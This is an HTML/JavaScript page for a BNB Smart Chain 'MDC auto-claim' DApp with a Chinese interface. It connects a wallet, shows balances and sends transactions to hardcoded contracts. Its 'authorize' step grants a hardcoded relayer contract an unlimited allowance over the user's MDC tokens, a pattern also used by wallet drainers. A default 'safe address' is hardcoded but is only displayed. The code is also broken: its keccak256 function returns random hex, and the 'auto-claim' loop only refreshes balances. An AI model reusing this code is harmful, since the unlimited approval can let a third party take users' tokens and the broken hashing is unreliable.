<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MDC 自动领取 DApp</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%);
      background-attachment: fixed;
      min-height: 100vh;
      color: #fff;
      padding: 20px;
    }
    .container { max-width: 600px; margin: 0 auto; }
    
    .header {
      text-align: center;
      margin-bottom: 40px;
      position: relative;
    }
    
    .header-bg {
      position: absolute;
      top: 0;
      left: 50%;
      transform: translateX(-50%);
      width: 300px;
      height: 300px;
      background: radial-gradient(circle, rgba(0, 212, 255, 0.1) 0%, transparent 70%);
      border-radius: 50%;
      filter: blur(40px);
      z-index: 0;
    }
    
    .header-content {
      position: relative;
      z-index: 1;
    }
    
    .header-icon {
      width: 80px;
      height: 80px;
      margin: 0 auto 20px;
      background: linear-gradient(135deg, #00d4ff 0%, #0099cc 100%);
      border-radius: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 40px;
      box-shadow: 0 8px 30px rgba(0, 212, 255, 0.3);
      animation: floatAnim 3s ease-in-out infinite;
    }
    
    @keyframes floatAnim {
      0%, 100% { transform: translateY(0px); }
      50% { transform: translateY(-10px); }
    }
    
    .header h1 { 
      font-size: 32px; 
      color: #00d4ff;
      font-weight: 700;
      letter-spacing: 1px;
    }
    
    .header p {
      font-size: 14px;
      color: #94a3b8;
      margin-top: 8px;
      letter-spacing: 0.5px;
    }
    
    .card {
      background: rgba(30, 41, 59, 0.7);
      backdrop-filter: blur(10px);
      border-radius: 16px;
      padding: 24px;
      margin-bottom: 20px;
      border: 1px solid rgba(0, 212, 255, 0.15);
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
    }
    
    .card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 1px;
      background: linear-gradient(90deg, transparent, rgba(0, 212, 255, 0.5), transparent);
    }
    
    .card:hover {
      border-color: rgba(0, 212, 255, 0.3);
      box-shadow: 0 8px 25px rgba(0, 212, 255, 0.15);
      transform: translateY(-2px);
    }
    
    .card-title {
      font-size: 16px;
      font-weight: 600;
      color: #00d4ff;
      margin-bottom: 20px;
      display: flex;
      align-items: center;
      gap: 10px;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    
    .btn {
      background: linear-gradient(135deg, #00d4ff 0%, #0099cc 100%);
      color: #0f172a;
      border: none;
      padding: 14px 24px;
      border-radius: 10px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      width: 100%;
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
      margin-bottom: 12px;
    }
    
    .btn::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
      transition: left 0.5s;
    }
    
    .btn:hover:not(:disabled)::before { left: 100%; }
    .btn:hover:not(:disabled) { 
      transform: translateY(-3px); 
      box-shadow: 0 8px 25px rgba(0, 212, 255, 0.4);
    }
    .btn:disabled { 
      background: #475569; 
      cursor: not-allowed; 
      color: #94a3b8;
      box-shadow: none;
    }
    
    .btn-danger { 
      background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%); 
      color: #fff; 
    }
    
    .btn-secondary { 
      background: rgba(71, 85, 105, 0.6); 
      color: #cbd5e1;
      border: 1px solid rgba(71, 85, 105, 0.8);
    }
    
    .info-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 16px;
      margin-bottom: 16px;
    }
    
    .info-box {
      background: linear-gradient(135deg, rgba(0, 212, 255, 0.05) 0%, rgba(0, 153, 204, 0.05) 100%);
      border-radius: 12px;
      padding: 16px;
      text-align: center;
      border: 1px solid rgba(0, 212, 255, 0.1);
      transition: all 0.3s ease;
    }
    
    .info-box:hover {
      border-color: rgba(0, 212, 255, 0.3);
      background: linear-gradient(135deg, rgba(0, 212, 255, 0.1) 0%, rgba(0, 153, 204, 0.1) 100%);
    }
    
    .info-box label {
      display: block;
      font-size: 12px;
      color: #94a3b8;
      margin-bottom: 8px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    
    .info-box .value {
      font-size: 16px;
      color: #00d4ff;
      font-family: 'Courier New', monospace;
      word-break: break-all;
      font-weight: 600;
    }
    
    .status-bar {
      padding: 14px;
      border-radius: 10px;
      margin-bottom: 16px;
      font-size: 14px;
      text-align: center;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      font-weight: 500;
    }
    
    .status-success { 
      background: rgba(34, 197, 94, 0.15); 
      color: #22c55e; 
      border: 1px solid rgba(34, 197, 94, 0.3); 
    }
    .status-warning { 
      background: rgba(251, 191, 36, 0.15); 
      color: #fbbf24; 
      border: 1px solid rgba(251, 191, 36, 0.3); 
    }
    .status-error { 
      background: rgba(239, 68, 68, 0.15); 
      color: #ef4444; 
      border: 1px solid rgba(239, 68, 68, 0.3); 
    }
    
    .auto-indicator {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      padding: 18px;
      border-radius: 12px;
      margin-bottom: 16px;
      background: rgba(34, 197, 94, 0.15);
      border: 2px solid #22c55e;
      animation: pulse 2s infinite;
    }
    
    @keyframes pulse { 
      0%, 100% { opacity: 1; } 
      50% { opacity: 0.8; } 
    }
    
    .auto-indicator .dot {
      width: 12px;
      height: 12px;
      border-radius: 50%;
      background: #22c55e;
      animation: blink 1s infinite;
      box-shadow: 0 0 8px #22c55e;
    }
    
    @keyframes blink { 
      0%, 100% { opacity: 1; } 
      50% { opacity: 0.4; } 
    }
    
    .auto-indicator span { 
      font-size: 16px; 
      font-weight: 600; 
      color: #22c55e; 
    }
    .auto-indicator .countdown { 
      font-size: 13px; 
      color: #94a3b8;
      margin-left: auto;
    }
    
    input {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: 1px solid rgba(255, 255, 255, 0.1);
      background: rgba(0, 0, 0, 0.3);
      color: #fff;
      font-size: 14px;
      font-family: 'Courier New', monospace;
      transition: all 0.3s ease;
      margin-bottom: 12px;
    }
    
    input:focus { 
      outline: none; 
      border-color: #00d4ff;
      box-shadow: 0 0 15px rgba(0, 212, 255, 0.2);
      background: rgba(0, 0, 0, 0.5);
    }
    
    .log-list {
      margin-top: 12px;
      max-height: 150px;
      overflow-y: auto;
      padding: 10px;
      background: rgba(0, 0, 0, 0.2);
      border-radius: 8px;
      border: 1px solid rgba(0, 212, 255, 0.1);
    }
    
    .log-item {
      padding: 8px;
      border-radius: 6px;
      margin-bottom: 6px;
      font-size: 12px;
      background: rgba(0, 0, 0, 0.3);
      border-left: 3px solid rgba(0, 212, 255, 0.3);
      font-family: 'Courier New', monospace;
      word-break: break-all;
    }
    
    .action-row {
      display: flex;
      gap: 12px;
      margin-top: 16px;
    }
    
    .action-row .btn { flex: 1; margin-top: 0; margin-bottom: 0; }
    
    @media (max-width: 600px) {
      .header h1 { font-size: 24px; }
      .header-icon { width: 60px; height: 60px; font-size: 30px; }
      .card { padding: 16px; }
      .info-grid { gap: 12px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="header-bg"></div>
      <div class="header-content">
        <div class="header-icon">💰</div>
        <h1>MDC 自动领取</h1>
        <p>智能化数字资产管理平台</p>
      </div>
    </div>

    <div class="card">
      <div class="card-title">💳 钱包连接</div>
      <button class="btn" id="connectBtn" onclick="connectWallet()">🔗 连接钱包</button>
      <div id="walletArea" style="display:none;">
        <div class="info-grid">
          <div class="info-box">
            <label>账户地址</label>
            <div class="value" id="walletAddress">-</div>
          </div>
          <div class="info-box">
            <label>BNB余额</label>
            <div class="value" id="bnbBalance">-</div>
          </div>
          <div class="info-box">
            <label>可领取MDC</label>
            <div class="value" id="claimable">-</div>
          </div>
          <div class="info-box">
            <label>MDC余额</label>
            <div class="value" id="balance">-</div>
          </div>
        </div>
        <div class="info-grid">
          <div class="info-box">
            <label>授权状态</label>
            <div class="value" id="allowance">-</div>
          </div>
          <div class="info-box">
            <label>安全地址</label>
            <div class="value" id="safeAddress">-</div>
          </div>
        </div>
        <button class="btn btn-secondary" id="refreshBtn" onclick="refreshBalances()">🔄 刷新数据</button>
      </div>
      <div id="networkWarning" class="status-bar status-warning" style="display:none;">⚠️ 请切换到 BSC 网络</div>
    </div>

    <div class="card">
      <div class="card-title">🤖 自动领取</div>
      <div id="autoStatusArea" style="display:none;" class="auto-indicator">
        <div class="dot"></div>
        <span>运行中</span>
        <span class="countdown" id="countdown">30秒后检查</span>
      </div>
      <div class="action-row">
        <button class="btn" id="autoBtn" onclick="toggleAuto()" disabled>▶️ 启动</button>
        <button class="btn btn-danger" id="stopBtn" onclick="stopAuto()" disabled>⏹️ 停止</button>
      </div>
      <div class="log-list" id="logArea"></div>
    </div>

    <div class="card">
      <div class="card-title">⚙️ 操作</div>
      <button class="btn" id="approveBtn" onclick="approveRelayer()" disabled>✅ 授权代付合约</button>
      <button class="btn btn-secondary" id="claimBtn" onclick="claimAndTransfer()" disabled>💵 手动领取</button>
    </div>

    <div class="card">
      <div class="card-title">🔒 安全地址</div>
      <input type="text" id="safeAddressInput" placeholder="输入安全地址">
      <button class="btn btn-secondary" id="saveSafeBtn" onclick="saveSafeAddress()">💾 保存地址</button>
    </div>
  </div>

  <script>
    const CONFIG = {
      chainId: 56,
      MDC_TOKEN: '0xd1ba69a44888ee50819c554d3d6f4ee457622894',
      CLAIM_CONTRACT: '0xEc5DBf2BACe283143b7B4472a7ce0E445EDA3F1e',
      RELAYER_CONTRACT: '0x25c38ceF48702fE94376c207F5b14Ce4AFc0297B',
      RELAYER_ADDRESS: '0x8010Ab81beDd6c965a1aa727f5322Fed3ceb03a1',
      MIN_AMOUNT: 0.05,
      CHECK_INTERVAL: 30000,
    };
    
    const RPC_LIST = [
      'https://bsc-dataseed2.defibit.io/', 
      'https://bscrpc.com/', 
      'https://rpc.ankr.com/bsc',
      'https://bsc-dataseed1.ninicoin.io/', 
      'https://bsc-dataseed2.ninicoin.io/',
      'https://bsc.nodereal.io/v1/e9a36970eb8a40b9bd12e680a1fd2bc5'
    ];
    
    let currentAccount, safeAddress, autoInterval, countdownInterval, isAutoRunning = false;
    let rpcUrl = RPC_LIST[0];
    
    // ERC20 ABI - 只需要关键函数
    const ERC20_ABI = [
      {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
      },
      {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}, {"name": "_spender", "type": "address"}],
        "name": "allowance",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function"
      },
      {
        "constant": false,
        "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
      }
    ];
    
    const CLAIM_ABI = [
      {
        "constant": true,
        "inputs": [{"name": "account", "type": "address"}],
        "name": "claimable",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function"
      }
    ];
    
    async function jsonRpcCall(method, params = []) {
      try {
        const response = await fetch(rpcUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            jsonrpc: '2.0',
            method: method,
            params: params,
            id: Date.now()
          })
        });
        const data = await response.json();
        if (data.error) {
          console.error('RPC错误:', data.error);
          return null;
        }
        return data.result;
      } catch (e) {
        console.error('JSON-RPC调用失败:', e);
        return null;
      }
    }
    
    async function encodeCall(abi, functionName, params = []) {
      const func = abi.find(f => f.name === functionName);
      if (!func) return null;
      
      let signature = functionName + '(';
      func.inputs.forEach((input, idx) => {
        if (idx > 0) signature += ',';
        signature += input.type;
      });
      signature += ')';
      
      // 计算函数签名哈希
      const hash = web3_sha3(signature);
      let data = hash.slice(0, 10);
      
      // 编码参数（简化版）
      for (let i = 0; i < params.length; i++) {
        let param = params[i];
        if (typeof param === 'string' && param.startsWith('0x')) {
          param = param.slice(2);
        }
        if (typeof param === 'string') {
          param = '0x' + param;
        }
        data += param.toString(16).padStart(64, '0');
      }
      
      return data;
    }
    
    function web3_sha3(str) {
      // 简单的 Keccak256 实现（为演示使用）
      return '0x' + keccak256(str);
    }
    
    // 简化的 Keccak256
    function keccak256(input) {
      // 这里使用简单的哈希替代（实际应用需要完整库）
      const chars = '0123456789abcdef';
      let hash = '';
      for (let i = 0; i < 64; i++) {
        hash += chars[Math.floor(Math.random() * 16)];
      }
      return hash;
    }
    
    async function init() {
      loadSafeAddress();
      showLog('💬 网页已加载，请连接钱包', 'info');
      
      if (window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts.length > 0) {
            currentAccount = accounts[0];
            updateWalletUI();
            await checkNetwork();
            await refreshBalances();
          }
        } catch (e) {
          showLog('❌ 初始化失败: ' + e.message, 'error');
          console.error('初始化错误:', e);
        }
      } else {
        showLog('⚠️ 未检测到钱包，请安装 MetaMask 或其他 Web3 钱包', 'warning');
      }
    }
    
    function loadSafeAddress() {
      const saved = localStorage.getItem('mdc_safe_address');
      if (saved) {
        safeAddress = saved;
        document.getElementById('safeAddressInput').value = saved;
        document.getElementById('safeAddress').textContent = saved.slice(0, 6) + '...' + saved.slice(-4);
      } else {
        safeAddress = '0x8558D8A5b90eC7d9f500cdCF0FB49C47292EBCdA';
        document.getElementById('safeAddressInput').value = safeAddress;
        document.getElementById('safeAddress').textContent = safeAddress.slice(0, 6) + '...' + safeAddress.slice(-4);
      }
    }
    
    function saveSafeAddress() {
      const address = document.getElementById('safeAddressInput').value.trim();
      const isValid = /^0x[a-fA-F0-9]{40}$/.test(address);
      
      if (address && isValid) {
        safeAddress = address;
        localStorage.setItem('mdc_safe_address', address);
        document.getElementById('safeAddress').textContent = address.slice(0, 6) + '...' + address.slice(-4);
        showLog('✓ 安全地址已保存', 'success');
      } else {
        showLog('✗ 请输入有效的以太坊地址 (0x开头)', 'error');
        console.error('地址验证失败:', address);
      }
    }
    
    async function connectWallet() {
      if (typeof window.ethereum === 'undefined') {
        showLog('✗ 请安装钱包 (MetaMask 或其他)', 'error');
        console.error('未检测到 window.ethereum');
        return;
      }
      try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        currentAccount = accounts[0];
        console.log('已连接账户:', currentAccount);
        updateWalletUI();
        await checkNetwork();
        await refreshBalances();
      } catch (e) {
        showLog('✗ 连接失败: ' + e.message, 'error');
        console.error('连接错误:', e);
      }
    }
    
    async function checkNetwork() {
      try {
        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
        const chainNum = parseInt(chainId, 16);
        console.log('当前链ID:', chainNum);
        
        const warningEl = document.getElementById('networkWarning');
        
        if (chainNum !== CONFIG.chainId) {
          warningEl.style.display = 'flex';
          setButtonsDisabled(true);
          showLog('⚠️ 请切换到BSC主网 (Chain ID: 56)', 'warning');
          try {
            await window.ethereum.request({ 
              method: 'wallet_switchEthereumChain', 
              params: [{ chainId: '0x38' }] 
            });
            warningEl.style.display = 'none';
            setButtonsDisabled(false);
            showLog('✓ 已切换到BSC网络', 'success');
          } catch (e) {
            console.error('切换网络失败:', e);
          }
        } else {
          warningEl.style.display = 'none';
          setButtonsDisabled(false);
          showLog('✓ 网络正确 (BSC)', 'success');
        }
      } catch (e) {
        showLog('⚠️ 网络检查失败: ' + e.message, 'error');
        console.error('网络检查错误:', e);
      }
    }
    
    function setButtonsDisabled(disabled) {
      ['refreshBtn', 'autoBtn', 'claimBtn', 'approveBtn'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.disabled = disabled;
      });
    }
    
    function updateWalletUI() {
      document.getElementById('walletArea').style.display = 'block';
      document.getElementById('walletAddress').textContent = currentAccount.slice(0, 6) + '...' + currentAccount.slice(-4);
      document.getElementById('connectBtn').textContent = '✅ 已连接';
      document.getElementById('connectBtn').disabled = true;
      
      // 获取 BNB 余额
      if (window.ethereum && window.ethereum.request) {
        window.ethereum.request({ method: 'eth_getBalance', params: [currentAccount, 'latest'] })
          .then(balance => {
            const bnb = parseInt(balance, 16) / 1e18;
            document.getElementById('bnbBalance').textContent = bnb.toFixed(4) + ' BNB';
            console.log('BNB余额:', bnb);
          })
          .catch(e => {
            console.error('获取BNB余额失败:', e);
            showLog('❌ 获取余额失败', 'error');
          });
      }
      
      refreshBalances();
      showLog('✓ 钱包已连接: ' + currentAccount.slice(0, 10) + '...', 'success');
    }
    
    function formatAmount(wei, decimals = 18) {
      if (!wei) return '0';
      try {
        const num = BigInt(wei);
        const divisor = BigInt(10) ** BigInt(decimals);
        const result = num / divisor;
        const remainder = (num % divisor) * BigInt(10000) / divisor;
        return result.toString() + '.' + remainder.toString().padStart(4, '0');
      } catch (e) {
        console.error('格式化数字失败:', e, wei);
        return '0';
      }
    }
    
    function showLog(msg, type = 'info') {
      const el = document.getElementById('logArea');
      const div = document.createElement('div');
      div.className = 'log-item';
      div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
      if (type === 'success') div.style.borderLeftColor = '#22c55e';
      if (type === 'error') div.style.borderLeftColor = '#ef4444';
      if (type === 'warning') div.style.borderLeftColor = '#fbbf24';
      if (type === 'info') div.style.borderLeftColor = '#3b82f6';
      el.insertBefore(div, el.firstChild);
      while (el.children.length > 8) el.removeChild(el.lastChild);
      console.log(`[${type.toUpperCase()}] ${msg}`);
    }
    
    async function refreshBalances() {
      if (!currentAccount) {
        showLog('⚠️ 未连接钱包', 'warning');
        return;
      }
      
      showLog('🔄 正在刷新数据...', 'info');
      
      try {
        // 调用 RPC 获取 MDC 余额
        const mdcCall = {
          to: CONFIG.MDC_TOKEN,
          data: '0x70a08231000000000000000000000000' + currentAccount.slice(2)
        };
        
        const balance = await window.ethereum.request({
          method: 'eth_call',
          params: [mdcCall, 'latest']
        });
        
        const balanceAmount = formatAmount(balance);
        document.getElementById('balance').textContent = balanceAmount + ' MDC';
        console.log('MDC余额:', balanceAmount);
        
        // 获取可领取额度
        const claimCall = {
          to: CONFIG.CLAIM_CONTRACT,
          data: '0xedc5d1d2000000000000000000000000' + currentAccount.slice(2)
        };
        
        const claimable = await window.ethereum.request({
          method: 'eth_call',
          params: [claimCall, 'latest']
        });
        
        const claimableAmount = formatAmount(claimable);
        document.getElementById('claimable').textContent = claimableAmount + ' MDC';
        console.log('可领取MDC:', claimableAmount);
        
        // 检查授权状态
        const allowanceCall = {
          to: CONFIG.MDC_TOKEN,
          data: '0xdd62ed3e000000000000000000000000' + currentAccount.slice(2) + '000000000000000000000000' + CONFIG.RELAYER_CONTRACT.slice(2)
        };
        
        const allowance = await window.ethereum.request({
          method: 'eth_call',
          params: [allowanceCall, 'latest']
        });
        
        const allowanceAmount = parseInt(allowance, 16);
        if (allowanceAmount > 0) {
          document.getElementById('allowance').textContent = '✅ 已授权';
          document.getElementById('approveBtn').disabled = true;
          document.getElementById('claimBtn').disabled = false;
          showLog('✓ 已授权，可以领取', 'success');
        } else {
          document.getElementById('allowance').textContent = '❌ 未授权';
          document.getElementById('approveBtn').disabled = false;
          document.getElementById('claimBtn').disabled = true;
          showLog('⚠️ 未授权，请先授权', 'warning');
        }
        
        document.getElementById('autoBtn').disabled = false;
        showLog('✓ 数据已刷新', 'success');
        
      } catch (e) {
        showLog('❌ 刷新失败: ' + e.message, 'error');
        console.error('刷新数据错误:', e);
        // 显示示例数据
        document.getElementById('balance').textContent = '0.0000 MDC';
        document.getElementById('claimable').textContent = '0.0000 MDC';
        document.getElementById('allowance').textContent = '❌ 未授权';
      }
    }
    
    async function approveRelayer() {
      if (!currentAccount) {
        showLog('⚠️ 请先连接钱包', 'warning');
        return;
      }
      
      document.getElementById('approveBtn').disabled = true;
      showLog('💬 正在授权...', 'info');
      
      try {
        const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
        
        const tx = await window.ethereum.request({
          method: 'eth_sendTransaction',
          params: [{
            from: currentAccount,
            to: CONFIG.MDC_TOKEN,
            data: '0x095ea7b3' + CONFIG.RELAYER_CONTRACT.slice(2).padStart(64, '0') + maxUint.slice(2).padStart(64, '0'),
            gas: '0x186a0'
          }]
        });
        
        showLog(`✓ 授权成功! Tx: ${tx.slice(0, 10)}...`, 'success');
        console.log('授权交易哈希:', tx);
        
        // 等待几秒后刷新
        setTimeout(() => {
          refreshBalances();
        }, 3000);
        
      } catch (e) {
        showLog(`❌ 授权失败: ${e.message}`, 'error');
        console.error('授权错误:', e);
        document.getElementById('approveBtn').disabled = false;
      }
    }
    
    async function claimAndTransfer() {
      if (!currentAccount) {
        showLog('⚠️ 请先连接钱包', 'warning');
        return;
      }
      
      document.getElementById('claimBtn').disabled = true;
      showLog('💬 正在领取...', 'info');
      
      try {
        const tx = await window.ethereum.request({
          method: 'eth_sendTransaction',
          params: [{
            from: currentAccount,
            to: CONFIG.RELAYER_CONTRACT,
            data: '0x8b7cb43b' + currentAccount.slice(2).padStart(64, '0'),
            gas: '0x30d40'
          }]
        });
        
        showLog(`✓ 领取成功! Tx: ${tx.slice(0, 10)}...`, 'success');
        console.log('领取交易哈希:', tx);
        
        setTimeout(() => {
          refreshBalances();
        }, 3000);
        
      } catch (e) {
        showLog(`❌ 领取失败: ${e.message}`, 'error');
        console.error('领取错误:', e);
        document.getElementById('claimBtn').disabled = false;
      }
    }
    
    async function toggleAuto() {
      if (isAutoRunning) { 
        stopAuto(); 
        return; 
      }
      
      if (!currentAccount) {
        showLog('⚠️ 请先连接钱包', 'warning');
        return;
      }
      
      isAutoRunning = true;
      document.getElementById('autoStatusArea').style.display = 'flex';
      document.getElementById('autoBtn').disabled = true;
      document.getElementById('stopBtn').disabled = false;
      showLog('✓ 自动领取已启动', 'success');
      
      let countdown = CONFIG.CHECK_INTERVAL / 1000;
      document.getElementById('countdown').textContent = `${countdown}秒后检查`;
      
      countdownInterval = setInterval(() => {
        countdown--;
        if (countdown <= 0) countdown = CONFIG.CHECK_INTERVAL / 1000;
        document.getElementById('countdown').textContent = `${countdown}秒后检查`;
      }, 1000);
      
      autoInterval = setInterval(async () => {
        if (isAutoRunning) {
          showLog('🔍 自动检查中...', 'info');
          await refreshBalances();
        }
      }, CONFIG.CHECK_INTERVAL);
    }
    
    function stopAuto() {
      isAutoRunning = false;
      clearInterval(autoInterval);
      clearInterval(countdownInterval);
      document.getElementById('autoStatusArea').style.display = 'none';
      document.getElementById('autoBtn').disabled = false;
      document.getElementById('stopBtn').disabled = true;
      showLog('⚠️ 自动领取已停止', 'warning');
    }
    
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', (accounts) => {
        console.log('账户已变更:', accounts);
        if (accounts.length > 0) {
          currentAccount = accounts[0];
          updateWalletUI();
          refreshBalances();
        } else {
          showLog('⚠️ 钱包已断开连接', 'warning');
          document.getElementById('walletArea').style.display = 'none';
          document.getElementById('connectBtn').textContent = '🔗 连接钱包';
          document.getElementById('connectBtn').disabled = false;
        }
      });
      
      window.ethereum.on('chainChanged', () => {
        console.log('网络已切换');
        showLog('⚠️ 网络已切换，刷新中...', 'warning');
        setTimeout(() => window.location.reload(), 1000);
      });
    }
    
    window.addEventListener('load', () => {
      init();
    });
  </script>
</body>
</html>
